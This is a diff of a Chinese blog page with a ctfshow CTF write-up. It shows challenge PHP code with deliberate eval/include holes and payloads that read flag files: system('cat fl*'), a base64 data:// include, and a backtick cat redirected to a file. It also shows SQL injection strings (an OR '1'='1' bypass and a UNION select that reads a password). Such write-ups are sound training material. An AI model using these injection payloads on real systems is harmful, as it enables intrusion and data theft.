@@ -17,15 +17,15 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="命令执行 ctfshow web入门篇  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-">
+    <meta name="description" content="ctfshow-web-wp ctfshow web入门篇（部分）  一、命令执行  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Las">
 <meta property="og:type" content="article">
 <meta property="og:title" content="命令执行">
 <meta property="og:url" content="https://cl1ck-t0.github.io/2026/07/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="命令执行 ctfshow web入门篇  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-">
+<meta property="og:description" content="ctfshow-web-wp ctfshow web入门篇（部分）  一、命令执行  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Las">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-07-21T02:01:34.000Z">
-<meta property="article:modified_time" content="2026-07-21T04:18:15.828Z">
+<meta property="article:modified_time" content="2026-07-21T13:26:54.217Z">
 <meta property="article:author" content="Cl1ck-t0">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -156,7 +156,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text"> 命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2web30"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3web38"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4web74"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web-wp"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow-web-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web30"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web38"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web74"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web171"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web172"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.web172</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -232,14 +232,15 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h1>
-<p>ctfshow web入门篇</p>
-<h2 id="1web29"><a class="markdownIt-Anchor" href="#1web29"></a> 1.web29</h2>
+        <h1 id="ctfshow-web-wp"><a class="markdownIt-Anchor" href="#ctfshow-web-wp"></a> ctfshow-web-wp</h1>
+<p>ctfshow web入门篇（部分）</p>
+<h2 id="一-命令执行"><a class="markdownIt-Anchor" href="#一-命令执行"></a> 一、命令执行</h2>
+<h3 id="1web29"><a class="markdownIt-Anchor" href="#1web29"></a> 1.web29</h3>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>非常简单不多说直接上payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://e1c8a274-c9ed-4d9d-9efa-b8eb3e052baa.challenge.ctf.show/?c=system(&#x27;cat fl*&#x27;);</span><br></pre></td></tr></table></figure>
 <p><strong>ctfshow{de157d64-7dc2-4a01-af46-6582c7cbb94b}</strong></p>
-<h2 id="2web30"><a class="markdownIt-Anchor" href="#2web30"></a> 2.web30</h2>
+<h3 id="2web30"><a class="markdownIt-Anchor" href="#2web30"></a> 2.web30</h3>
 <p>和29差不多</p>
 <p>采用include和php伪协议</p>
 <p>由于过滤检查的是c参数，</p>
@@ -256,20 +257,29 @@
 <p>文件写入也可以，只是我个人不怎么用（）</p>
 <p>payload如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=echo`cat ????.??? &gt;&gt; 1.txt`;</span><br></pre></td></tr></table></figure>
-<h2 id="3web38"><a class="markdownIt-Anchor" href="#3web38"></a> 3.web38</h2>
+<h3 id="3web38"><a class="markdownIt-Anchor" href="#3web38"></a> 3.web38</h3>
 <p>data</p>
 <p>感觉都差不多随手挑几个做，后面直接跳到最后几题看看就行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:  2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:  h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2020-09-04 05:23:36</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>}</p>
-<p>}else{<br />
-highlight_file(<strong>FILE</strong>);<br />
-}</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
 <p><strong>ctfshow{f530af8d-3c5f-4b77-ace8-f62bb8c70aa8}</strong></p>
-<h2 id="4web74"><a class="markdownIt-Anchor" href="#4web74"></a> 4.web74</h2>
+<h3 id="4web74"><a class="markdownIt-Anchor" href="#4web74"></a> 4.web74</h3>
 <p>不是哥们随便挑一题环境坏了QAQ😡😭</p>
 <p>ps：我就说为什么后面这几题账号那么久没人做，原来是都坏了（）</p>
 <p>后续有遇到新题再补充吧emmmmmm</p>
+<h2 id="二-文件上传"><a class="markdownIt-Anchor" href="#二-文件上传"></a> 二、文件上传</h2>
+<h2 id="三-sql注入"><a class="markdownIt-Anchor" href="#三-sql注入"></a> 三、SQL注入</h2>
+<h3 id="1web171"><a class="markdownIt-Anchor" href="#1web171"></a> 1.web171</h3>
+<p>字符型注入无漏洞</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>得到flag：ctfshow{20ffb6cb-c965-4c66-8f6e-3c4ec71a6b84}</p>
+<h3 id="2web172"><a class="markdownIt-Anchor" href="#2web172"></a> 2.web172</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>题目给了具体结构，不用再进行列行探测</p>
+<p>所以我们直接使用联合注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select password from ctfshow_user2 where username=&#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure>
+<p>得到flag：ctfshow{81156aaf-c4c1-4dad-a9d2-54039081fe76}</p>
 
     </div>
     <footer class="article-footer">
@@ -278,7 +288,7 @@ highlight_file(<strong>FILE</strong>);<br />
     <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/07/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://cl1ck-t0.github.io/2026/07/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></p>
     
     <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-07-21 10:01:34</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-21 12:18:15</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-21 21:26:54</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
@@ -320,7 +330,7 @@ highlight_file(<strong>FILE</strong>);<br />
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/furina-de-fontaine-3840x2160-19459.jpg" data-sizes="auto" alt="Web入门——爆破" class="lazyload">
+          <img data-src="/covers/pd-image.png" data-sizes="auto" alt="Web入门——爆破" class="lazyload">
       <a href="/2026/07/20/Web%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E7%88%86%E7%A0%B4/" aria-label="Next: Web入门——爆破"  title="Next: Web入门——爆破"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
@@ -369,7 +379,7 @@ highlight_file(<strong>FILE</strong>);<br />
       </div>
       <div>
         <span class="icon-brush"></span>
-        39k
+        39.2k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         03:02
@@ -394,7 +404,7 @@ highlight_file(<strong>FILE</strong>);<br />
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text"> 命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2web30"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3web38"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4web74"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web-wp"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow-web-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web30"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web38"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web74"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web171"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web172"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.web172</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -531,9 +541,9 @@ highlight_file(<strong>FILE</strong>);<br />
           url: "https://cl1ck-t0.github.io/2026/07/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
           excerpt: "",
           description: "",
-          stripContent: " 命令执行 ctfshow web入门篇  1.web29 1234567891011121314151617181920212223&amp;lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: htt",
+          stripContent: " ctfshow-web-wp ctfshow web入门篇（部分）  一、命令执行  1.web29 1234567891011121314151617181920212223&amp;lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa",
           date: "Tue Jul 21 2026 10:01:34 GMT+0800",
-          updated: "Tue Jul 21 2026 12:18:15 GMT+0800",
+          updated: "Tue Jul 21 2026 21:26:54 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
